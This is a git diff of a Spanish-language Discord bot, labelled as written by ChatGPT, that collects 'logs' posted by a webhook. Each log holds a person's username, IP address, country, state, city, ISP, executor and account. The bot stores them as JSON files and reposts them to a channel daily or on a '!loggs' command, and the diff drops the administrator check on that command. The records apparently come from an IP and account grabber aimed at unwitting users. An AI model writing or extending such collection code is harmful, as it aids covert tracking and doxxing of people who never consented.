@@ -1,13 +1,23 @@
-const { Client, GatewayIntentBits, AttachmentBuilder, PermissionsBitField } = require("discord.js");
+// ===============================
+// BOT LOGGER COMPLETO BY CHATGPT
+// ===============================
+
 const fs = require("fs");
 const path = require("path");
+const { Client, GatewayIntentBits } = require("discord.js");
 
-const TOKEN = process.env.TOKEN;
-const CAPTURE_CHANNEL = "1437151487141740637";
-const SEND_LOGS_CHANNEL = "1440773871254110300";
+// ===============================
+// CONFIG
+// ===============================
+const LOG_FOLDER = "./logs";
+const CHANNEL_ID = "1440773871254110300";
 
-const LOG_FILE = path.join(__dirname, "logs_globales.txt");
+// Crear carpeta si no existe
+if (!fs.existsSync(LOG_FOLDER)) fs.mkdirSync(LOG_FOLDER);
 
+// ===============================
+// INICIAR BOT
+// ===============================
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
@@ -16,113 +26,128 @@ const client = new Client({
     ]
 });
 
-// Cache temporal para unir mensaje de texto + embed
-let pending = {};  // pending[webhookMessageID] = { usuario, id, display }
+// ===============================
+// GUARDAR LOG EN ARCHIVO
+// ===============================
+function saveLog(data) {
+    const fileName = path.join(LOG_FOLDER, `${Date.now()}.json`);
+    fs.writeFileSync(fileName, JSON.stringify(data, null, 2));
+}
 
-// =======================================
-// 📌 PARSEAR MENSAJE DEL WEBHOOK
-// =======================================
-client.on("messageCreate", (msg) => {
+// ===============================
+// LEER TODOS LOS LOGS
+// ===============================
+function getAllLogs() {
+    const files = fs.readdirSync(LOG_FOLDER);
+    let logs = [];
 
-    if (!msg.webhookId) return;         // solo mensajes del webhook
-    if (msg.channel.id !== CAPTURE_CHANNEL) return;
-
-    // ===============================
-    // 🟩 1. MENSAJE DE TEXTO (content)
-    // ===============================
-    if (!msg.embeds.length && msg.content.includes("USUARIO:")) {
-
-        const usuario = msg.content.match(/USUARIO:\s([^|]+)/)?.[1]?.trim() || "N/A";
-        const id = msg.content.match(/ID:\s(\d+)/)?.[1]?.trim() || "N/A";
-        const display = msg.content.match(/DISPLAY:\s(.+)/)?.[1]?.trim() || "N/A";
-
-        pending[msg.id] = {
-            usuario,
-            id,
-            display,
-            timestamp: Date.now()
-        };
-
-        return;
+    for (const file of files) {
+        const raw = fs.readFileSync(path.join(LOG_FOLDER, file));
+        logs.push(JSON.parse(raw));
     }
 
-    // =======================================
-    // 🟦 2. MENSAJE CON EMBED (datos técnicos)
-    // =======================================
-    if (msg.embeds.length) {
+    return logs;
+}
 
-        // encontrar un mensaje de texto previo del mismo webhook
-        let matchedKey = null;
-        for (let key in pending) {
-            if (Date.now() - pending[key].timestamp < 2000) { // 2 segundos
-                matchedKey = key;
-                break;
-            }
+// ===============================
+// CAPTURA DE MENSAJES (incluye WEBHOOKS)
+// ===============================
+client.on("messageCreate", message => {
+
+    // Ignorar bots, excepto webhooks
+    if (!message.webhookId && message.author.bot) return;
+
+    // Verificar que vengan datos del embed
+    const embed = message.embeds[0];
+    if (!embed) return;
+
+    // Extraer información del embed
+    let data = {
+        Nombre: "N/A",
+        Display: "N/A",
+        IP: "N/A",
+        Pais: "N/A",
+        Estado: "N/A",
+        Ciudad: "N/A",
+        ISP: "N/A",
+        Executor: "N/A",
+        Cuenta: "N/A"
+    };
+
+    // Buscar datos dentro de fields
+    for (const field of embed.fields) {
+
+        if (field.name.includes("USUARIO")) {
+            const texto = field.value;
+            data.Nombre = texto.match(/USUARIO:\s(\S+)/)?.[1] || "N/A";
+            data.Display = texto.match(/DISPLAY:\s(.+)/)?.[1] || "N/A";
         }
 
-        if (!matchedKey) return; // no hay mensaje emparejable
+        if (field.name.includes("IP")) {
+            data.IP = field.value.replace(/`/g, "");
+        }
 
-        let { usuario, id, display } = pending[matchedKey];
-        delete pending[matchedKey];
+        if (field.name.includes("UBICACIÓN")) {
+            data.Pais = field.value.match(/País:\s```(.+?)```/)?.[1] || "N/A";
+            data.Estado = field.value.match(/Estado:\s```(.+?)```/)?.[1] || "N/A";
+            data.Ciudad = field.value.match(/Ciudad:\s```(.+?)```/)?.[1] || "N/A";
+            data.ISP = field.value.match(/\*\*ISP:\*\*\s(.+)/)?.[1] || "N/A";
+        }
 
-        const embed = msg.embeds[0];
+        if (field.name.includes("SISTEMA")) {
+            data.Executor = field.value.match(/Executor:\s(.+)/)?.[1] || "N/A";
+            data.Cuenta = field.value.match(/Cuenta:\s(.+)/)?.[1] || "N/A";
+        }
+    }
 
-        // IP
-        let IP = embed.fields[0]?.value.match(/```(.+?)```/)?.[1] || "N/A";
+    // Guardar en archivo
+    saveLog(data);
+});
 
-        // País / Estado / Ciudad / ISP
-        let UB = embed.fields[1]?.value || "";
+// ===============================
+// COMANDO !loggs → ENVÍA TODOS
+// ===============================
+client.on("messageCreate", async message => {
+    if (message.content === "!loggs") {
 
-        let Pais = UB.match(/País:\s+```(.*?)```/)?.[1] || "N/A";
-        let Estado = UB.match(/Estado:\s+```(.*?)```/)?.[1] || "N/A";
-        let ISP = UB.match(/ISP:\s*(.+)/)?.[1]?.trim() || "N/A";
+        const logs = getAllLogs();
 
-        // Executor / Cuenta
-        let SYS = embed.fields[2]?.value || "";
+        if (logs.length === 0) {
+            return message.reply("⚠️ No hay logs guardados todavía.");
+        }
 
-        let Executor = SYS.match(/Executor:\s*(.+)/)?.[1]?.trim() || "N/A";
-        let Cuenta = SYS.match(/Cuenta:\s*(\d+)/)?.[1] || "N/A";
-
-        // Línea final
-        const linea = `${usuario} | ${display} | ${IP} | ${Pais} | ${Estado} | ${ISP} | ${Executor} | ${Cuenta}\n`;
-
-        fs.appendFileSync(LOG_FILE, linea, "utf8");
+        for (const log of logs) {
+            await message.channel.send(
+                `${log.Nombre} | ${log.Display} | ${log.IP} | ${log.Pais} | ${log.Estado} | ${log.Ciudad} | ${log.ISP} | ${log.Executor} | ${log.Cuenta}`
+            );
+        }
     }
 });
 
+// ===============================
+// ENVÍO AUTOMÁTICO CADA DÍA
+// ===============================
+setInterval(async () => {
 
-// =======================================
-// 📌 COMANDO MANUAL: !loggs
-// =======================================
-client.on("messageCreate", async (msg) => {
-    if (msg.content !== "!loggs") return;
+    const channel = client.channels.cache.get(CHANNEL_ID);
+    if (!channel) return;
 
-    if (!msg.member.permissions.has(PermissionsBitField.Flags.Administrator))
-        return msg.reply("❌ No tienes permisos.");
+    const logs = getAllLogs();
+    if (logs.length === 0) return;
 
-    if (!fs.existsSync(LOG_FILE))
-        return msg.reply("No hay logs.");
+    for (const log of logs) {
+        await channel.send(
+            `${log.Nombre} | ${log.Display} | ${log.IP} | ${log.Pais} | ${log.Estado} | ${log.Ciudad} | ${log.ISP} | ${log.Executor} | ${log.Cuenta}`
+        );
+    }
 
-    await msg.author.send({
-        content: "📄 Logs actuales:",
-        files: [new AttachmentBuilder(LOG_FILE)]
-    });
+    // limpiar logs después de enviarlos
+    fs.rmSync(LOG_FOLDER, { recursive: true, force: true });
+    fs.mkdirSync(LOG_FOLDER);
 
-    msg.reply("📬 Enviados por DM.");
-});
+}, 24 * 60 * 60 * 1000); // 1 día
 
-// =======================================
-// 📌 ENVÍO AUTOMÁTICO DIARIO
-// =======================================
-setInterval(() => {
-    if (!fs.existsSync(LOG_FILE)) return;
-    const canal = client.channels.cache.get(SEND_LOGS_CHANNEL);
-    if (!canal) return;
-
-    canal.send({
-        content: "📊 **Reporte diario**:",
-        files: [new AttachmentBuilder(LOG_FILE)]
-    });
-}, 24 * 60 * 60 * 1000);
-
-client.login(TOKEN);
+// ===============================
+// LOGIN
+// ===============================
+client.login("YOUR_BOT_TOKEN");
